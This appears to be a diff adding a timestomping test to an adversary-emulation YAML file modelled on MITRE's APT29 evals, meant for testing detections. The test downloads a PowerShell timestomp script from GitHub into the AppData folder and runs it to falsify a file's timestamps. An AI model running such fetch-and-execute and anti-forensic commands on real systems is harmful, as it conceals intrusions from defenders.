@@ -188,3 +188,46 @@ atomic_tests:
       Get-ChildItem #{file_path} | % { $_.LastAccessTime = "#{target_date_time}" }
     cleanup_command: |
       Remove-Item #{file_path} -Force -ErrorAction Ignore
+
+- name: Windows - Timestomp a File
+  description: |
+    Timestomp kxwn.lock 
+
+    Successful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. 
+
+    [Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)
+  supported_platforms:
+    - windows
+  input_arguments:
+    file_path:
+      description: File path for timestomp payload
+      type: String
+      default: $env:appdata\Microsoft
+  
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        Validate if timestomp.ps1 is located in #{file_path}.
+      prereq_command: |
+        if (Test-Path #{file_path}\timestomp.ps1) {exit 0} else {exit 1}
+      get_prereq_command: |
+        Invoke-WebRequest "https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1" -OutFile "#{file_path}\timestomp.ps1"
+    - description: |
+        Validate kxwn.lock is present in #{file_path}.
+      prereq_command: |
+        if (Test-Path -path "#{file_path}\kxwn.lock") {exit 0} else {exit 1}
+      get_prereq_command: |
+        New-Item -Path #{file_path}\kxwn.lock -ItemType File
+
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      import-module #{file_path}\timestomp.ps1
+      timestomp -dest "#{file_path}\kxwn.lock"
+       
+    cleanup_command: |
+      Write-Host "Removing #{file_path}\timestomp.ps1"
+      Remove-Item #{file_path}\timestomp.ps1 -Force
+      Write-Host "Removing #{file_path}\kxwn.lock"
+      Remove-Item #{file_path}\kxwn.lock -Force
